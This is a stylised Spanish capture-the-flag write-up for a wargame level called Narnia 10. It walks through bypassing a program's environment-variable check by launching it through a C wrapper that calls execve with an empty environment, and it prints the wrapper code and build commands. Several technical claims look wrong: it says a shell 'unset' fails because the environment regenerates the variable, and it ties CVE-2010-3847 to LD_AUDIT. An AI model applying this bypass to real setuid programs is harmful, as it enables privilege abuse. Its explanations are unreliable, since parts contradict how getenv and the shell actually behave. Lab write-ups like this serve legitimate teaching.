*[Image: banner]*

```bash
$ ssh narnia10@narnia.labs.overthewire.org -p 2226

$ echo $TARGET
> una variable de entorno como filtro · un proceso que nace sin memoria · la validación que no encuentra nada

$ echo $VECTOR
> environment manipulation · execve con envp vacío · bypass de validación lógica por contexto
```

---

## `> [RECON]`

```bash
$ cat /narnia/narnia10.c
```

```c
if(getenv("BAD_ENV_VARIABLE") != NULL){
    printf("Exiting... Malicious environment detected.\n");
    exit(1);
}
```

El filtro existe. La lógica es correcta.
La suposición no lo es.

El programador asume que el entorno llega por la shell.
Que las variables están ahí porque alguien las puso.
Que controlar las variables es controlar el entorno.

`execve` tiene tres argumentos.
El tercero es `envp[]`: el array de variables de entorno del proceso hijo.
Se puede pasar vacío.
Se puede pasar como `NULL`.

Cuando eso ocurre, `getenv` devuelve `NULL` para cualquier consulta.
Cualquiera.
El filtro busca la variable prohibida.
No la encuentra.
No porque no sea peligrosa.
Porque el proceso nació sin memoria.

---

## `> [HYPOTHESIS]`

```diff
+ getenv() busca en el entorno del proceso. si el entorno está vacío, devuelve NULL siempre.
+ execve() acepta envp[] como tercer argumento. se puede pasar { NULL }: entorno vacío.
+ con envp vacío, la validación if(getenv(...) != NULL) nunca se activa.
+ el flujo continúa hacia la función vulnerable posterior.
- intenté unset BAD_ENV_VARIABLE desde la shell. el entorno de red la regeneraba.
- exporté la variable con valor vacío. el filtro verifica existencia, no contenido.
  "" != NULL. el programa igual sale.
```

---

## `> [ATTEMPTS]`

<details>
<summary><code>// 3l pr0c3s0 n4c10 s1n m3m0r14.</code></summary>

```bash
#: intento 1
$ export BAD_ENV_VARIABLE=""
$ /narnia/narnia10
# Exiting... Malicious environment detected.
# el filtro verifica el puntero, no el valor.
# "" existe. NULL no existe. son cosas distintas.

#: intento 2
$ unset BAD_ENV_VARIABLE
$ /narnia/narnia10
# Exiting... Malicious environment detected.
# el entorno tiene otras variables que regeneran el contexto.
# o el sistema la vuelve a poner. no es suficiente limpiar desde la shell.

#: intento 3
# necesitamos nacer limpios. no limpiar después de nacer.
# escribimos un wrapper en C que use execve con envp vacío.
$ cat > /tmp/wrapper.c << 'EOF'
#include <unistd.h>
int main() {
    char *args[] = { "/narnia/narnia10", NULL };
    char *env[]  = { NULL };
    execve(args[0], args, env);
    return 0;
}
EOF
$ gcc /tmp/wrapper.c -o /tmp/wrapper
$ /tmp/wrapper
```

```txt
entorno: vacío.
getenv("BAD_ENV_VARIABLE"): NULL.
filtro: no activado.
flujo: continúa.
```

</details>

---

## `> [BREAK]`

Invocación desde la shell:

```
shell → hereda environ → /narnia/narnia10
                              ↓
                    getenv("BAD_ENV_VARIABLE") → puntero válido → EXIT
```

Invocación con wrapper:

```
shell → wrapper → execve(path, args, { NULL })
                              ↓
                    /narnia/narnia10 nace sin entorno
                              ↓
                    getenv("BAD_ENV_VARIABLE") → NULL → filtro inactivo → continúa
```

El binario buscó en los bolsillos del proceso una variable prohibida.
El proceso no tenía bolsillos.
Nació sin ellos.

No hackeaste el filtro.
Controlaste el momento antes de que el proceso existiera.

`execve` tiene ese tercer argumento documentado en POSIX desde los años 70.
No es una vulnerabilidad. Es una funcionalidad.
El error está en asumir que el entorno es un dato confiable.
Que lo que heredas es lo que siempre estará.

> *→ [`/lore/execve_envp.md`](../lore/execve_envp.md)*

---

## `> [EXPLOIT]`

```c
// /tmp/wrapper.c
#include <unistd.h>
int main() {
    char *args[] = { "/narnia/narnia10", NULL };
    char *env[]  = { NULL };
    execve(args[0], args, env);
    return 0;
}
```

```bash
gcc /tmp/wrapper.c -o /tmp/wrapper && /tmp/wrapper
```

```
envp = { NULL }     → entorno vacío. cero variables. cero herencia.
getenv(cualquier)   → NULL. siempre. sin excepción.
el filtro           → busca. no encuentra. no porque la variable sea inofensiva.
                       porque el proceso nació sin memoria de nada.
execve              → tres argumentos. el tercero casi nadie lo piensa.
                       eso es exactamente el problema.
```

---

## `> [FLAG]`

```
[REDACTED]
```

> n0 m3 l4 d1g4s. n0 m3 1nt3r3s4.
> 3l pr3m10 n0 3s un str1ng d3 t3xt0.

---

## `> [REFLECTION]`

```diff
+ getenv verifica existencia del puntero, no el valor del string. "" != NULL.
+ unset desde la shell no es suficiente si el entorno se regenera.
+ execve con envp vacío = proceso sin herencia. el filtro no encuentra nada porque no hay nada.
+ el entorno no es un dato confiable. es lo que el padre decidió dar.
- exportar variable con valor vacío → el puntero existe. el filtro actúa igual.
- limpiar después de nacer → tarde. hay que controlar el momento del nacimiento.
```

---

## `> echo $CHALLENGE`

El proceso nació sin memoria.
El filtro buscó. No encontró.
No porque fallara: porque el contexto no existía.

`execve` tiene ese tercer argumento desde POSIX.1.
Documentado. Público. Disponible para cualquiera.

Busca **environment variable injection**.
Busca cuántos programas SUID en producción
confían en variables de entorno para tomar decisiones de seguridad.
Busca **CVE-2010-3847**: ld.so y la variable `LD_AUDIT`.
Un proceso que heredó algo que no debía heredar.
Acceso root. Sin tocar el código.

El entorno no es contexto neutro.
Ya lo dijo Narnia 1.
Narnia 10 lo confirma desde el otro lado:
también puedes vaciarlo.

---

```
█████████████████████████████████████████████
█                                           █
█   n0 l1mp14st3 3l 3nt0rn0.              █
█         c0ntr0l4st3 3l n4c1m13nt0.       █
█                                           █
█████████████████████████████████████████████
```

> *→[https://youtube.com/t474-r0b07](https://youtube.com/@kaderd.garnica?si=9vk1E6Gkkb7LftTK)*
---

> *→ anterior: [narnia9](narnia09.md)**→ siguiente: [narnia11](narnia11.md)*

> > 🔴 **UN NIVEL MÁS**
>
> El entorno estaba vacío. La biblioteca no.
>
> 🧭 **[ÍNDICE DEL LORE](https://github.com/t474-r0b07/ctf-writeups/tree/main/lore)**

---
<!-- 0x65 0x6e 0x76 0x70 // 3l t3rc3r 4rgum3nt0 qu3 n4d13 l33. -->
